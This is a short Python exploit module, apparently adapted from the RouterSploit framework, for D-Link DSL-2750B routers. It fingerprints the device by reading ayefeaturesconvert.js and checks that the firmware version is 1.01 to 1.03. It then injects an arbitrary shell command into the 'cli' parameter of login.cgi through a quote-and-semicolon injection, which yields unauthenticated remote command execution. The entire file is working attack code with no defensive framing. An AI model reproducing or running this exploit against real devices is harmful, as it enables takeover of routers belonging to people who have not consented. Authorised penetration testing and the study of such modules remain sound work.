# rsf exploit module
# description: Module exploits RCE vulnerability in D-Link DSL-2750B devices
import re
import requests

def execute(target, port, cmd):
    try:
        path = f"/login.cgi?cli=multilingual show';{cmd}'$"
        requests.get(f"http://{target}:{port}{path}", timeout=5)
        return True
    except:
        return False

def check(target, port=80):
    try:
        response = requests.get(f"http://{target}:{port}/ayefeaturesconvert.js", timeout=5)
        if response.status_code == 200 and "DSL-2750B" in response.text:
            version = re.findall(r"AYECOM_FWVER=\"(.*?)\";", response.text)
            if version and "1.01" <= version[0] <= "1.03":
                return True
        return False
    except:
        return False
